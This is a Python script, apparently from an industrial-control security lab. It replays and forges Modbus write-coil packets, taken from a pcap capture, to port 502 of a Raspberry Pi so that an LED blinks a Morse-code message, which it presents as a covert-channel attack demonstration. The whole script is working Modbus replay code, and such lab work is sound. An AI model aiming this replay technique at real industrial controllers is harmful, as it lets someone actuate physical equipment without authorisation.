#!/usr/bin/env python3
"""pattern attack - send covert messages via LED"""
import socket
import time
import sys
from scapy.all import *
from scapy.layers.inet import IP, TCP

# path to pcap
pcap_path = "/Users/cj/Desktop/modbus_lab/cps-modbus-lab/cps-modbus-lab/pcap/one_write_coil_full.pcap"

# read pcap
try:
    packets = rdpcap(pcap_path)
    print(f"[+] successfully read {len(packets)} packets")
except Exception as e:
    print(f"[!] error reading pcap: {e}")
    sys.exit(1)

# find modbus on payload
led_on_payload = None
for i, pkt in enumerate(packets):
    if pkt.haslayer(TCP) and pkt.haslayer(Raw) and pkt[TCP].dport == 502:
        payload = bytes(pkt[Raw])
        if len(payload) >= 8:
            led_on_payload = payload
            print(f"[+] found modbus payload: {payload.hex()}")
            break

if not led_on_payload:
    print("[!] no modbus query packet found")
    sys.exit(1)

# create off payload by modifying ON payload
led_off_payload = bytearray(led_on_payload)
led_off_payload[-2:] = b'\x00\x00'  # change FF00 to 0000 (on to off)

# morse code dictionary
# . = dot (short)
# - = dash (long)
MORSE = {
    'A': '.-', 'B': '-...', 'C': '-.-.', 'D': '-..',
    'E': '.', 'F': '..-.', 'G': '--.', 'H': '....',
    'I': '..', 'J': '.---', 'K': '-.-', 'L': '.-..',
    'M': '--', 'N': '-.', 'O': '---', 'P': '.--.',
    'Q': '--.-', 'R': '.-.', 'S': '...', 'T': '-',
    'U': '..-', 'V': '...-', 'W': '.--', 'X': '-..-',
    'Y': '-.--', 'Z': '--..', ' ': '/'
}


def led_control(state, duration, target):
    # control LED for specified duration
    s = socket.socket()
    s.connect((target, 502))
    # send appropriate payload
    if state:
        s.send(led_on_payload)
    else:
        s.send(bytes(led_off_payload)) # convert bytearray to bytes
    s.close()
    # hold state for specific time
    time.sleep(duration)


def send_morse_char(char, target):
    # blink LED in morse code for one character
    pattern = MORSE.get(char.upper(), '')

    # special case for the space between words
    if pattern == '/':  # space between words
        print("   [space]")
        led_control(False, 1.4, target)  # long pause for word gap
        return

    # display what is being sent
    print(f"   {char} = {pattern}")

    # transmit each dot or dash
    for symbol in pattern:
        if symbol == '.':  # dot
            led_control(True, 0.2, target)  # short on
            led_control(False, 0.2, target)  # short off
        elif symbol == '-':  # dash
            led_control(True, 0.6, target)  # long on
            led_control(False, 0.2, target)  # short off

    # gap between letters (LED stays off)
    led_control(False, 0.4, target)


# main attack
target = sys.argv[1] if len(sys.argv) > 1 else "raspberrypi.local"
message = sys.argv[2] if len(sys.argv) > 2 else "SOS"

print(f"[*] pattern attack - covert channel via LED")
print(f"[*] sending message: '{message}'")
print(f"[*] morse code pattern:")
print(f"    . = short flash (dot)")
print(f"    - = long flash (dash)")
print("")

# ensure LED starts off
led_control(False, 0.5, target)

# send message
for char in message:
    send_morse_char(char, target)

# ensure LED ends off
led_control(False, 0.5, target)

# information
print("\n[*] covert message transmitted!")
print("[*] this demonstrates:")
print("    - data exfiltration through physical systems")
print("    - covert communication channels")
print("    - how attackers can signal other systems")
print("    - physical indication of cyber compromise")

# show what was sent
print(f"\n[*] message '{message}' in morse:")
for char in message:
    if char == ' ':
        print(f"    [space]")
    else:
        print(f"    {char} = {MORSE.get(char.upper(), '?')}")